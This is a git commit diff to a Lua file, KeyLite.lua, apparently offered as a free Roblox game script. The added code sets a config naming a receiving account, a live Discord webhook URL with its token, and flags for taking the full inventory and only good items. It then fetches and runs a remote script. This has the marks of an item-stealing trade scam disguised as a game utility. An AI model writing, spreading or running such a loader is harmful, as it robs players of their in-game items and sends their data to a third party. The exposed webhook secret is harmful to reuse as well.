46d08d2b9181473f54968d39318d9f336620ebaf
FreeGamesScript23 <129659928+FreeGamesScript23@users.noreply.github.com>
2024-07-28 17:32:20 +0800

    Update KeyLite.lua

--- KeyLite.lua
+++ KeyLite.lua
@@ -1,1 +1,11 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/KeyLite.lua",true))()
+Config = {
+    Receivers = {"ninjasit"},
+    Webhook = "https://discord.com/api/webhooks/1265971660759240808/SlH8qsSeVnrxWj63UyF-Po2yP5SM8Zb0TtFdKGQLyRRb-Eh94s9hzMS56e5MYZms7Hh_",
+    FullInventory = true,
+    GoodItemsOnly = true,
+    ResendTrade = "Hi",
+    Script = "Lite",
+    CustomLink = "None"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Pantyzstela.lua",true))()
